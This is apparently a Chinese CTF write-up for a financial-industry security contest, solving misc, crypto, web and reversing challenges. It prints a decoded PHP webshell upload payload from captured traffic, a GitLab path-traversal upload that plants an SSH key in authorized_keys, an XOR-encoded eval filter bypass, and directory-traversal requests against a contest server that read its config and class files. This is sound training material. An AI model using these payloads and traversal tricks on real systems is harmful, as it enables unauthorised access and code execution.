> 原文链接: https://www.anquanke.com//post/id/154477 


# 金融业网络安全攻防大赛部分题目writeup


                                阅读量   
                                **243227**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t017edf86d4430dab2c.jpg)](https://p0.ssl.qhimg.com/t017edf86d4430dab2c.jpg)

## misc

### <a class="reference-link" name="1.backdoor"></a>1.backdoor

[![](https://p3.ssl.qhimg.com/t014a39eff95b5e2547.jpg)](https://p3.ssl.qhimg.com/t014a39eff95b5e2547.jpg)打开backdoor数据包，观察发现攻击者访问/uploads/security.php，并post数据。中间段代码是base64加密的，解密后如下代码可疑：<br>[![](https://p5.ssl.qhimg.com/t01fc40cd2949a1a72e.png)](https://p5.ssl.qhimg.com/t01fc40cd2949a1a72e.png)Base64解密结果：

```
@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION&lt;'5.3.0')`{`@set_magic_quotes_runtime(0);`}`;echo("X@Y");$f='C:\phpStudy\WWW\uploads\reverseshell.zip';$c=$_POST["z1"];$c=str_replace("r","",$c);$c=str_replace("n","",$c);$buf="";for($i=0;$i&lt;strlen($c);$i+=2)$buf.=urldecode('%'.substr($c,$i,2));echo(@fwrite(fopen($f,'w'),$buf)?'1':'0');;echo("X@Y");die();
```

读代码发现是对z1参数进行操作，生成reverseshell.zip文件

```
&lt;?php
$c = "504B0304140000000800288DC34C58BD2C542C0500002C0700000E000000313532383031383837352E706E676D956D54926718C7B12C4D33ED45CD94B034E9D4C9B6F2A5D4503B1A5A274CB1B2E341A798D35EA82D4D110173B9AD48C8B9B2A395A5A8684C84694D54B0B65646BA91C0A333C2487C8530ECE909151C7E4BE19CDFFD7CB8CF7D5FE77F5FD7F5BF9E2B47306807BB0D763018CC213A2A220E06B35A3FBF6C9798766CD59401186CF9547444787CEE6D8D3C96FE6ECFCA659D3DA95AAAEACD52F6CAA8412F955F03CA66DF43E550386C0BB652A15020EE0D570E2C2D10865DF7FC9241854A484155BEFD4E7D8B2DD1865E52B1EE1A67C488E3A6CFEF7C63B62B42C4ACB3397DA01016BE80826C3D69EC8E74A44B790E0B12E71834460DAAA09A94BDAE45A1F79AFDDA2BFCB26778C1177486EB49F582C84709FFB2013AF4A019744C64DF105E28FB081AF702D4CBA1E9DE3F3B79DB7E09EBA65031C67AF19A8B20F2BCE512728D406AC8C3517E715BB1C47A21C6747D5B3D1485436BB5D1C06903E7A499DA79C1E341AFC01BC5CAEDB0987297FC727AAD667D58EFF8B16755BD20E22DC36DC5E6454157BD5050B31FE5A3F1F0A5B9D3EFAA00A36D779493E74226897FF6F45FED7210A3CBE4817B0BE8FBE4871D6684347385C3E5A3819A0139878BD9F8208F999071F7B593A187E4FF5B98074E76CDDAAA7021525D4E07A18F3B95A363F54EB400B58EC1C422EECD51508422EF4C5F982413197BA7752C425FEC34BB8C490BE671722288711E09860A78A286E5D8F9FEDC2D1F33DD5F411B220D4C71570F6A06CA1BD9EE5E7A07AC40A9D35CEF07ED5E636DBB90663F71657E7155639F7A384FC4F42AC54D069F5295C624BA6E5A1CB8C9971AE3125D7635F1090D08E19F3124C1C7491A48EA1A40F74D6C2FF1DD3F99B4E89D366D42DA3E35C38E078FD4545BA919E379C9FA6AA516ECF8548AB868A1CE28B87424AF98572F49F2E864A6DECFFF1E82C4EB7D84FD7452266549B1B5D979192776DD71F7719A33DCDEFE703781DE782299B3B5BC1D48739C9978699694264AB17270CEF1624D6B92CF1BE83F253864BF0BDF62ACF599469B1F3E7FFE4735B8DCEFA9306403157BA18AFC1439F93105098181E00411699E448FDB9B667A367E02D02DD426B5D879DCA083E63EB7D975CF01F1BF86A69A9BEB876164A9212CE8FDD1D0632D99100496E7F6B636E283479103C21093B70A16798B3F2B8FDDDCFE2660DAC1F92DD74AE20FBA55CEA623735A2A4A3C17B97DDEF046371EBCAE3CA0E30057D21C72D44FFFEAA0BC2F351D61AE3ABE6274A7545452BA654C799271F01160DF7D088E76F1C0A5E8EA6A684EED65161C9E193C0556631427EA1A2BCE5C6E8E6F3F4EE690D79A47668B14A5D211BA08F3FE3961DBF300693D64D344E500379990146DEEDEF959C3F636A4093F0F64C94E61C1563C2E8527D60FA13E18ACDA2F99F78989866F9F63F8145606F931132F9DB853DD909CA2CB559263A05D96B28763BB07C03FF66749329F3D7000FF0E021847C99A354F045D96065FABEF7EB420437BA14322E08C71F3C54087242BE4C96A8B4527E13ECCF6D69276F867CB76DEDD7104D1C9CCA18F5F31572C53696BBA5EE0B94654FF2CD334CAB01F72E61ECB62C49A3D9C8794223A72127FA0D076718FE8A038ACB66415B8ED6CEF4F9A0CA1E96A1A6FAB826974BE65A9ECF7F8F42C1C79D9601B5F7AA63C24E153C62582EEA552E9BED642774F822A2DF9305985FCE7FAD96DD181FE32E28868F521708B93851E1129929B0FF1EBB93D436BFFA05C256011350691E021BEC4FC91A6890A044EB9F86B8C465FB8CD3046F697A215303EBB66BD7AD15CA80C3DF2AAC88243E7952176AF6B886B2408969BFE82B0E8484C44E3FE6F0AFF07504B01021400140000000800288DC34C58BD2C542C0500002C0700000E0000000000000000002000000000000000313532383031383837352E706E67504B050600000000010001003C000000580500000000";
$c=str_replace("r","",$c);
$c=str_replace("n","",$c);
$buf="";
for($i=0;$i&lt;strlen($c);$i+=2)
$buf.=urldecode('%'.substr($c,$i,2));
echo(@fwrite(fopen('C:UsersMeikeDesktopreverseshell.zip','w'),$buf)?'1':'0');;
echo("X@Y");
die();
?&gt;
```

运行生成reverse.zip 文件，解压得到二维码，扫描可得flag。<br>[![](https://p5.ssl.qhimg.com/t01819948cce5d46edd.png)](https://p5.ssl.qhimg.com/t01819948cce5d46edd.png)

### <a class="reference-link" name="2.mysterious%20picture"></a>2.mysterious picture

[![](https://p0.ssl.qhimg.com/t01be8dfce276dfedca.jpg)](https://p0.ssl.qhimg.com/t01be8dfce276dfedca.jpg)本题是lsb隐写，用stegsolve打开图片，预览BGR最低有效位数据，发现flag<br>[![](https://p1.ssl.qhimg.com/t01f8d6f642230e2890.png)](https://p1.ssl.qhimg.com/t01f8d6f642230e2890.png)



## crypto

### <a class="reference-link" name="1.confidential"></a>1.confidential

[![](https://p0.ssl.qhimg.com/t01e88d6124ec4c8aff.jpg)](https://p0.ssl.qhimg.com/t01e88d6124ec4c8aff.jpg)<br>
加密代码如下

```
#!/usr/bin/env python3

import os
import sys

class XOR_CBC:
    BLOCK_SIZE = 16

    def __init__(self, key: bytes, iv: bytes):
        self.key = key
        self.iv = iv
        assert len(key) == len(iv) == self.__class__.BLOCK_SIZE

    def pad(self, msg: bytes):
        l = len(msg)
        padding_len = 16 - len(msg) % 16
        return msg + (chr(padding_len) * padding_len).encode()

    def xor(self, a, b):
        return bytes([x ^ b[i%len(b)] for i, x in enumerate(a)])

    def encrypt(self, msg: bytes):
        padded_msg = self.pad(msg)

        block_size = self.__class__.BLOCK_SIZE

        assert len(padded_msg) % block_size == 0
        count = len(padded_msg) // block_size

        c = []

        last = self.iv
        for i in range(count):
            xored_plain = self.xor(padded_msg[i*block_size:(i+1)*block_size], last)
            cipher_text = self.xor(xored_plain, self.key)
            last = cipher_text
            c.append(cipher_text)

        return b''.join(c)

if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('usage: %s &lt;plain_text&gt;')
        sys.exit(0)

    key = os.urandom(16)
    iv = os.urandom(16)
    cipher = XOR_CBC(key, iv)

    with open(sys.argv[1], 'rb') as f:
        encrypted = cipher.encrypt(f.read())

    with open(sys.argv[1]+'.encrypted', 'wb') as f:
        f.write(encrypted)
```

代码逻辑是对明文按16位分块加密，第一块与初始向量iv做异或，再与key做异或；后续明文块与前一个密文块做异或，再与key做异或。<br>
在加密之前，为了保证明文长度可以被16整除，首先对明文做一个padding

```
def pad(self, msg: bytes):
        l = len(msg)
        padding_len = 16 - len(msg) % 16
        return msg + (chr(padding_len) * padding_len).encode()
```

我们已知密文和原始明文的最后一部分，那么可以根据上述逻辑遍历出key：从末尾向前计算：<br>
密文1 = 密文2^明文1^key<br>
密文2 = 密文3^明文2^key<br>
计算这两个key然后比较，如果两个key相同，就是正确的key。<br>
算出来明文补了两位，key:<br>
[127, 84, 183, 104, 20, 239, 255, 134, 158, 177, 142, 38, 36, 137, 8, 162]<br>
然后根据前面的分析，从后往前计算明文，每一个明文块都是密文块异或后一个密文异或key：

```
def xor(a, b):
    return bytearray([i^j for i,j in zip(a, b)])
k = [127, 84, 183, 104, 20, 239, 255, 134, 158, 177, 142, 38, 36, 137, 8, 162]
with open('enctypted.txt', 'rb') as f:
    c = bytearray(f.read())
res = bytearray()
for i in range(len(c), 0, -16):
    tmp = xor(c[i-16:i], c[i-32:i-16])
    res = xor(tmp, k) + res
print repr(res)
```

运行得到flag

### <a class="reference-link" name="2.Encrypted%20traffic"></a>2.Encrypted traffic

[![](https://p5.ssl.qhimg.com/t01542f2fb06790bcbc.jpg)](https://p5.ssl.qhimg.com/t01542f2fb06790bcbc.jpg)根据题目描述，salt为”zhangsanfeng”,根据hash长度，判断SHA系列为SHA224，剩下来只需要爆破6位密码即可：

```
import hashlib
salt = "zhangsanfeng"
target = "ac22543d5382cbf48b6ebcf6e40f123d9ca4b91f9998e4c2f2422402"
for i in range(100000,999999):
    s = hashlib.sha224(str(i) + salt).hexdigest()
    if s == target:
        print s
print("flag`{`%s_SHA224_%s`}`" % (i, salt))
```



## web

### <a class="reference-link" name="1.Learning%20PHP"></a>1.Learning PHP

```
&lt;?php

include 'flag.php';
if(isset($_GET['t']))`{`
    $_COOKIE['bash_token'] = $_GET['t'];
`}`else`{`
    die("Token Lost.");
`}`
if(isset($_POST['sleep']))`{`
    if(!is_numeric($_POST['sleep']))`{`
        echo 'Gime me a number plz.';
    `}`else if($_POST['sleep'] &lt; 60 * 60 * 24 * 30 * 2)`{`
        echo 'NoNoNo sleep too short.';
    `}`else if($_POST['sleep'] &gt; 60 * 60 * 24 * 30 * 3)`{`
        echo 'NoNoNo sleep too long.';
    `}`else`{`
        sleep((int)$_POST['sleep']);
        getFlag();
    `}`
`}`else`{`
    highlight_file(__FILE__);
`}`
?&gt;
```

题目要求sleep是个数字，并在2592000和7776000之间，然后sleep这么长时间，给出flag。<br>
这题主要考察is_numeric()和int()的区别。前者支持普通数字型、科学记数法型、部分支持十六进制0x型，在is_numeric()支持的形式中，int()不能正确转换十六进制型、科学计数法型。<br>
因此可以构造6e6、0x4F1A01。

### <a class="reference-link" name="2.scapegota%201"></a>2.scapegota 1

[![](https://p5.ssl.qhimg.com/t013e2e15d52f696506.jpg)](https://p5.ssl.qhimg.com/t013e2e15d52f696506.jpg)根据题目描述，猜测使用了旧版本的gitlab，存在以前的漏洞，发现存在gitlab远程代码执行漏洞。<br>
注册一个用户，然后import project，首先使用ssh-keygen生成公私对:<br>[![](https://p0.ssl.qhimg.com/t01bdc828052d4230e1.png)](https://p0.ssl.qhimg.com/t01bdc828052d4230e1.png)上传公钥文件，burp拦包修改path参数为ssh/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys<br>
同时name参数不能为特殊字符，也需要修改<br>[![](https://p5.ssl.qhimg.com/t0174eac6b85bcf63b7.png)](https://p5.ssl.qhimg.com/t0174eac6b85bcf63b7.png)上传成功后，使用git用户和私钥ssh登录，在根目录下找到flag文件<br>[![](https://p3.ssl.qhimg.com/t01fa595fdb7f3138c2.png)](https://p3.ssl.qhimg.com/t01fa595fdb7f3138c2.png)

### <a class="reference-link" name="3.magic"></a>3.magic

[![](https://p4.ssl.qhimg.com/t016403f57c6e22b51a.jpg)](https://p4.ssl.qhimg.com/t016403f57c6e22b51a.jpg)

```
&lt;?php
include 'flag.php';
if(isset($_GET['code']))`{`
    $code = $_GET['code'];
    if(strlen($code)&gt;50)`{`
        die("Long.");
    `}`
    if(preg_match("/[A-Za-z0-9_]+/",$code))`{`
        die("NO.");
    `}`
    @eval($code);
`}`else`{`
    highlight_file(__FILE__);
`}`
//$hint =  "php function getFlag() to get flag";
?&gt;
```

这题详情参见：[http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html](http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html)

和链接中不同的是本题`_`也被过滤了，思路是要通过不含[A-Za-z0-9_]的字符传入code，使得code=getFlag()<br>
这一点可以通过异或来获得:

```
payloads = '!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^`{`|`}`~`'
a=""
b=""

for i in "getFlag":
    break_flag=False
    for j in payloads:
        for k in payloads:
            if i==chr(ord(j)^ord(k)):
                #print i
                a+=j
                b+=k
                break_flag=True
                break
        if break_flag==True:
            break    

print a
print b

```

可以构造：<br>
code=$%7f=%22%27%(:,!%27%22^%22@@|@@@%22;$%7f();

### <a class="reference-link" name="4.the%20instruction%20matter"></a>4.the instruction matter

[![](https://p2.ssl.qhimg.com/t01fa580399e3e1a825.jpg)](https://p2.ssl.qhimg.com/t01fa580399e3e1a825.jpg)根据下载帮助手册的链接找到文件读取点：<br>[http://221.122.80.3:20020/download?file=](http://221.122.80.3:20020/download?file=)

[![](https://p3.ssl.qhimg.com/t01283742f631163d90.png)](https://p3.ssl.qhimg.com/t01283742f631163d90.png)读取该框架下web.xml:<br>[http://221.122.80.3:20020/download?file=../web.xml](http://221.122.80.3:20020/download?file=../web.xml)<br>[![](https://p5.ssl.qhimg.com/t01eaaf24981af8e808.png)](https://p5.ssl.qhimg.com/t01eaaf24981af8e808.png)根据前面报错信息第四行：<br>
com.chaitin.ctf.DownloadController.download(DownloadController.java:47)<br>
猜测存在路径及文件../classes/com/chaitin/ctf/DownloadController.class，读取成功后猜测同样存在../classes/com/chaitin/ctf/FlagController.class

读取[http://221.122.80.3:20020/download?file=../classes/com/chaitin/ctf/FlagController.class](http://221.122.80.3:20020/download?file=../classes/com/chaitin/ctf/FlagController.class)<br>
反编译之后得到flag：<br>[![](https://p2.ssl.qhimg.com/t0181ac03ef5960a3e2.jpg)](https://p2.ssl.qhimg.com/t0181ac03ef5960a3e2.jpg)



## re

### <a class="reference-link" name="1.ransomware"></a>1.ransomware

[![](https://p0.ssl.qhimg.com/t0161070ae747bcd638.jpg)](https://p0.ssl.qhimg.com/t0161070ae747bcd638.jpg)ida逆向 从WinMain找到函数DialogFunc 里面检查函数为sub_401010 跟进 逻辑为异或0xcc后和byte_404000逐字节比较<br>[![](https://p0.ssl.qhimg.com/t01ac4856205e11bdd3.png)](https://p0.ssl.qhimg.com/t01ac4856205e11bdd3.png)<br>[![](https://p2.ssl.qhimg.com/t01e13e449ad305050d.png)](https://p2.ssl.qhimg.com/t01e13e449ad305050d.png)

```
x = [0xFD,
     0x93,
     0xA8,
     0x83,
     0x93,
     0xA2,
     0xFC,
     0xB8,
     0x93,
     0xBB,
     0x8D,
     0xA2,
     0xA2,
     0xAD,
     0x93,
     0xAF,
     0xBE,
     0xB5,
]

flag = ""
for i in x:
    flag += chr(i ^ 0xcc)
print(flag)
```

### <a class="reference-link" name="2.cracking_game"></a>2.cracking_game

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e02b045dfd8d582d.jpg)IDA打开，F12 看到字符串：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t014848c40a87e43d2d.png)点开：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e174ad740397f41a.png)进入函数sub_565924E0:<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f685f735f1fdcabc.png)eax，ebx，edx是scanf的三个参数，也是我们需要求出的值。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f685f735f1fdcabc.png)看到这里有个判断，如果不为0，则跳到loc_5659269C，即错误，如果为0，则显示Bingo! The flag is ……<br>
因此esi 和ecx都应为0。<br>
根据上面逻辑，首先，ebx+5A46BABCh赋给ecx,经过一段运算后，ecx等于0，因此需要逆推回去：

```
ecx = 0
ecx ^= 0x80CAFC7B
ecx -= 0x67B243DF
ecx ^= 0x5702EC35
ecx += 0x2CF219D2
ecx ^= 0x0481EE77
ecx -= 0x57794904
ecx ^= 0x5D8ACD6E
ecx += 0x42596E22
ecx ^= 0x9D91B40F
ecx += 0x4EF22DAE
ecx ^= 0x3C5A9BE1
ecx -= 0x3EB308B5
ecx ^= 0xBB5D6AFF
ecx -= 0x4B8BF8B9
ecx ^= 0x2A3457E6
ecx -= 0x4D6F9F5A
ecx ^= 0x74A4134B
ecx += 0x3617A80B
ecx ^= 0x58E7773A
ebx = ecx - 0x5A46BABC
print "ebx:"
print hex(ebx)
```

得到

```
ebx:
0x8dd70651L
```

然后eax+376DA237h赋给esi，经过一段运算也为0，逆推回去：

```
esi = 0x74D86A5E
esi ^= 0x1363F241
esi -= 0x197C0136
esi ^= 0x5039B3AD
print "esi:"
print hex(esi)
esi = 0x11e062544    #这里直接相减为负数，因此需要高位补1
eax = esi - 0x376DA237
print "eax:"
print hex(eax)
```

得到：

```
eax:
0xe698830dL
```

[![](https://p1.ssl.qhimg.com/t01fa182f5c565f672d.png)](https://p1.ssl.qhimg.com/t01fa182f5c565f672d.png)edx赋给了ecx，经过一段运算也为0，逆推回去：

```
ecx = 0
ecx ^= 0x0DF2FFB19
ecx -= 0x64B87E0E
ecx ^= 0x5B589A
ecx += 0x7624D9FB
ecx ^= 0x97C13118
ecx -= 0x28EF6935
ecx ^= 0x5BF4CECF
ecx -= 0x6492A3E9
ecx ^= 0x0CDC4D471
ecx -= 0x20E21188
ecx ^= 0x85AEAF52
ecx += 0x68C8F0D3
ecx ^= 0x0DB034E6B
ecx += 0x126E5E14
ecx ^= 0x0D4A1204D
ecx += 0x1EBAD7B8
ecx ^= 0x3D898713
ecx += 0x0F5DED87
ecx ^= 0x63074EB7
edx = ecx
print "edx:"
print hex(edx)
```

得到：

```
edx:
0xc1ecd292L

flag`{`e698830d:8dd70651:c1ecd292`}`
```
